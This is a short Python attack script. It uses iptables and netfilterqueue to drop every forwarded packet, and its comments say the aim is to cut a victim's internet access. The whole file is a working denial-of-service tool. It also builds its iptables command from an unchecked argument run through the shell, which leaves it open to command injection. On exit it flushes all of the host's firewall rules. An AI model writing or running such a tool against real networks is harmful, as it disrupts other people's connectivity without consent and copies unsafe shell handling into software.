import netfilterqueue
import subprocess
import optparse


# get arguments q
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-q", "--queue_position", dest="queue_position",
                      help="queue position of iptable, for exemple '0'")
    (options, arguments) = parser.parse_args()
    return options.queue_position


# subprocess.call('sudo apt-get install iptables', shell=True)

# use de funtion get_arguments to get queueu position
queue_positions = get_arguments()

# create a command to save information in iptable
s_iptables = f'iptables -I FORWARD -j NFQUEUE --queue-num {queue_positions}'

# call function
subprocess.call(s_iptables, shell=True)


# function to execute a drop packet and cut the internet access of victim
def process_packet(packet):
    print(packet)
    packet.drop()


# use function NetFilterQueue to execute a function in information recive
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

# if cancell process execute the flush in iptables
except KeyboardInterrupt:
    subprocess.call('iptables --flush', shell=True)
    print("[-] Stop Program IPTABLES deleted")
